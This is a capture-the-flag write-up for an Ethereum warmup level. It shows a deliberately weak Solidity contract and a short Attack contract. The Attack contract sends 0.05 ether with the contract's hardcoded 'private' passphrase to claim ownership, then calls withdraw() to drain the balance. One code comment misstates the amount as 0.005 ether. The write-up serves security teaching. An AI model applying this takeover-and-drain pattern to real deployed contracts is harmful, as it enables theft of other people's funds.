# Warmup

## Setup

The challenge is available at http://ethereum.sharkyctf.xyz/level/1

Before starting, it is recommended to follow the suggested steps at http://ethereum.sharkyctf.xyz/help to setup Metamask, get Ether from a Ropsten faucet, and Remix IDE.

## Challenge

The contract to attack is the following :

```solidity
pragma solidity = 0.4.25;

contract Logic {
    address public owner;
    bytes32 private passphrase = "th3 fl4g 1s n0t h3r3";
    
    constructor() public payable {
        owner = msg.sender;  
    }
    
    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.call.value(address(this).balance)();
    }

    function claim(bytes32 _secret) public payable {
        require(msg.value == 0.05 ether && _secret == passphrase);
        owner = msg.sender;
    }
}
```

The goal is then to be able to call `withdraw()` from the contract.

## Hint

There is no special trick for this challenge, you just need to be able to use `claim()` before calling `withdraw()`.

## Solution

As the previous warmup challenge, this challenge does not require knowledge about specific exploits and just test your ability to interact with contracts.

To attack this contract, we will create another contract called Attack, which will be called to attack the first contract.

In the same Solidity file, add the following code :

```solidity
contract Attack {
    Logic public target;
    
     constructor (address _adress) public {
        target = Logic(_adress);
    }
    
     function attack() public payable {
        bytes32 passphrase = "th3 fl4g 1s n0t h3r3";
        
        // We send the 0.005 ether to the target
        target.claim.value(0.05 ether)(passphrase);
        
        // Once it is unlocked we withdraw the money;
        target.withdraw();
    }
}
```